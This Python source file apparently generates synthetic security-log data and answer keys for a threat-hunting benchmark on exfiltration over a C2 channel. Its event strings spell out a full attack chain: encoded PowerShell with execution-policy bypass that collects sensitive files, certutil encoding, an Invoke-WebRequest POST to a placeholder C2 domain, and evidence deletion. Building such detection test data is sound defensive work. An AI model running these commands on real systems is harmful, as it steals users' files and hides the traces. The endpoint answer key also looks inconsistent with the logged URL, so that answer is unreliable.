import random
from datetime import datetime, timedelta
from faker import Faker
import polars as pl
from tqdm import tqdm
import base64

from ..utils import (
    generate_device_process_events,
    generate_outbound_network_events,
)

class ExfiltrationOverC2ChannelAttackGenerator:
    def __init__(self, benign_data, victims, attacker, last_scan_time, plausible_endpoints):
        self.fake = Faker()
        self.benign_data = benign_data
        self.last_scan_time = last_scan_time
        self.victims = pl.DataFrame(victims) if not isinstance(victims, pl.DataFrame) else victims
        self.c2_server_ip = attacker["ExternalServerIP"]
        self.c2_domain = attacker['ExternalServerName']
        self.data = None
        self.exfil_file = self.fake.file_name(extension="dat")  # Disguised exfil file
        if not plausible_endpoints:
            raise ValueError("plausible_endpoints must be provided to ExfiltrationOverC2ChannelAttackGenerator")
        self.plausible_endpoints = plausible_endpoints
    
    def generate_exfiltration_over_c2_channel_attack(self):
        data = {}
        process_events = []
        network_events = []

        campaign_time = self.fake.date_time_between(
            start_date=self.last_scan_time, 
            end_date=datetime.today()
        )
        compromised_victims = set()
        victim_selected = False

        plausible_endpoints = self.plausible_endpoints

        for victim in tqdm(self.victims.iter_rows(named=True),
                              desc="Generating exfiltration over C2 channel events for victims"):
            if random.random() < 1.0 or not victim_selected:
                victim_selected = True
                compromised_victims.add(victim["AccountUpn"])

                user_devices = self.benign_data["device_info"].filter(
                    pl.col("LoggedOnUsers").str.contains(victim["AccountUpn"])
                )
                user_device = user_devices.sample(n=1).to_dicts()[0]
                
                # Stage 1: Run malicious PowerShell command to collect data
                collect_time = campaign_time + timedelta(seconds=random.randint(0, 600))

                sensitive_dirs = ["C:\\Users\\", "C:\\Documents", "C:\\Secret", "C:\\Confidential", "D:\\Projects"]
                sensitive_actions = [
                    "Get-ChildItem -Path {0} -Recurse", 
                    "Get-Content (Get-ChildItem -Path {0} -Filter *.txt -Recurse).FullName",
                    "Get-ChildItem -Path {0} -Include *.docx,*.xlsx,*.pdf -Recurse"
                ]
                
                ps_action = random.choice(sensitive_actions).format(random.choice(sensitive_dirs))
                ps_command = f"{ps_action} | Out-File -FilePath {self.exfil_file}"

                encoded_command = base64.b64encode(ps_command.encode('utf-16-le')).decode()
                
                collect_command = f"powershell.exe -ExecutionPolicy Bypass -EncodedCommand {encoded_command}"
                collect_event = generate_device_process_events(
                    identity_row=victim,
                    device_row=user_device,
                    timestamp=collect_time,
                    fake=self.fake,
                    file_name="powershell.exe",
                    process_command_line=collect_command,
                )
                process_events.append(collect_event)

                # Stage 2: Encode and prepare data for exfiltration
                encode_time = collect_time + timedelta(seconds=random.randint(60, 180))
                encode_command = f"cmd.exe /c certutil -encode {self.exfil_file} {self.exfil_file}.b64"
                encode_event = generate_device_process_events(
                    identity_row=victim,
                    device_row=user_device,
                    timestamp=encode_time,
                    fake=self.fake,
                    file_name="cmd.exe",
                    process_command_line=encode_command,
                )
                process_events.append(encode_event)

                # Stage 3: Send data over C2 channel using a seemingly legitimate process
                exfil_time = encode_time + timedelta(seconds=random.randint(100, 300))
                chosen_endpoint = random.choice(plausible_endpoints)
                exfil_command = f"powershell.exe -Command \"$content = Get-Content -Path {self.exfil_file}.b64; Invoke-WebRequest -Uri https://{self.c2_domain}{chosen_endpoint} -Method POST -Body $content\""
                exfil_event = generate_device_process_events(
                    identity_row=victim,
                    device_row=user_device,
                    timestamp=exfil_time,
                    fake=self.fake,
                    file_name="powershell.exe",
                    process_command_line=exfil_command,
                )
                process_events.append(exfil_event)

                # Network connection to C2 server
                net_time = exfil_time + timedelta(seconds=random.randint(5, 50))
                net_event = generate_outbound_network_events(
                    identity_row=victim,
                    device_row=user_device,
                    timestamp=net_time,
                    fake=self.fake,
                    remote_ip=self.c2_server_ip,
                    remote_url=f"https://{self.c2_domain}/",
                    remote_port=443
                )
                network_events.append(net_event)

                # Cleanup evidence 
                cleanup_time = net_time + timedelta(seconds=random.randint(100, 300))
                cleanup_command = f"cmd.exe /c del {self.exfil_file}.b64 {self.exfil_file}"
                cleanup_event = generate_device_process_events(
                    identity_row=victim,
                    device_row=user_device,
                    timestamp=cleanup_time,
                    fake=self.fake,
                    file_name="cmd.exe",
                    process_command_line=cleanup_command,
                )
                process_events.append(cleanup_event)

        proc_df = pl.DataFrame(process_events).sort("Timestamp") if process_events else pl.DataFrame()
        net_df = pl.DataFrame(network_events).sort("Timestamp") if network_events else pl.DataFrame()
        data["device_process_events"] = proc_df
        data["device_network_events"] = net_df
        self.data = data
        
        if process_events and network_events:
            last_event_time = max(
                data["device_process_events"]["Timestamp"].max(), 
                data["device_network_events"]["Timestamp"].max()
            )
        elif process_events:
            last_event_time = data["device_process_events"]["Timestamp"].max()
        elif network_events:
            last_event_time = data["device_network_events"]["Timestamp"].max()
        else:
            last_event_time = self.last_scan_time
            
        compromised_victims = self.victims.filter(pl.col("AccountUpn").is_in(compromised_victims)) if compromised_victims else pl.DataFrame()

        return data, compromised_victims, last_event_time

    def generate_question_answer_pairs(self):
        all_process_events = pl.concat(
            [self.benign_data["device_process_events"], self.data["device_process_events"]]
        )

        all_network_events = pl.concat(
            [self.benign_data["device_network_events"], self.data["device_network_events"]]
        )

        questions = []
        answers = []

        Q1 = "How many unique devices were involved in the C2 channel exfiltration events?"
        Q1_answer_df = (
            all_network_events
            .filter(pl.col("RemoteUrl").str.contains(self.c2_domain))
            .select(pl.col("DeviceId").n_unique())
        )
        Q1_answer = Q1_answer_df.to_series()[0] if Q1_answer_df.height > 0 else 0
        questions.append(Q1)
        answers.append(Q1_answer)

        Q2 = "What encoding method was used to prepare the data for exfiltration?"
        subset_df = all_process_events.filter(
            pl.col("ProcessCommandLine").str.contains("certutil -encode")
        )
        if subset_df.height > 0:
            Q2_answer = "Base64"
        else:
            Q2_answer = "N/A"
        questions.append(Q2)
        answers.append(Q2_answer)

        Q3 = "What is the C2 domain used for data exfiltration?"
        net_subset_df = all_network_events.filter(pl.col("RemoteUrl").str.contains(self.c2_domain))
        if net_subset_df.height > 0:
            Q3_answer = self.c2_domain
        else:
            Q3_answer = "N/A"
        questions.append(Q3)
        answers.append(Q3_answer)

        Q4 = "What port was used for C2 communication?"
        net_subset_df = all_network_events.filter(pl.col("RemoteUrl").str.contains(self.c2_domain))
        if net_subset_df.height > 0:
            Q4_answer = net_subset_df.select("RemotePort").item(0, 0)
        else:
            Q4_answer = "N/A"
        questions.append(Q4)
        answers.append(Q4_answer)

        Q5 = "What tools were used to perform the exfiltration?"
        tools = set()
        tool_subset_df = all_process_events.filter(
            (pl.col("ProcessCommandLine").str.contains(self.c2_domain)) | 
            (pl.col("ProcessCommandLine").str.contains("certutil -encode"))
        )
        if tool_subset_df.height > 0:
            for row in tool_subset_df.select("FileName").iter_rows():
                tools.add(row[0])
            Q5_answer = ", ".join(tools)
        else:
            Q5_answer = "N/A"
        questions.append(Q5)
        answers.append(Q5_answer)

        Q6 = "What evidence cleanup actions were performed after exfiltration?"
        cleanup_df = all_process_events.filter(
            pl.col("ProcessCommandLine").str.contains("del") & 
            pl.col("ProcessCommandLine").str.contains(self.exfil_file)
        )
        if cleanup_df.height > 0:
            Q6_answer = cleanup_df.select("ProcessCommandLine").item(0, 0)
        else:
            Q6_answer = "N/A"
        questions.append(Q6)
        answers.append(Q6_answer)

        Q7 = "What was the API endpoint used on the C2 server?"
        net_subset_df = all_network_events.filter(pl.col("RemoteUrl").str.contains(self.c2_domain))
        if net_subset_df.height > 0:
            url = net_subset_df.select("RemoteUrl").item(0, 0)
            try:
                endpoint = url.split(self.c2_domain)[1]
                Q7_answer = endpoint
            except (IndexError, AttributeError):
                Q7_answer = "N/A"
        else:
            Q7_answer = "N/A"
        questions.append(Q7)
        answers.append(Q7_answer)

        qa_df = pl.DataFrame({"Question": questions, "Answer": answers}, strict=False)
        return qa_df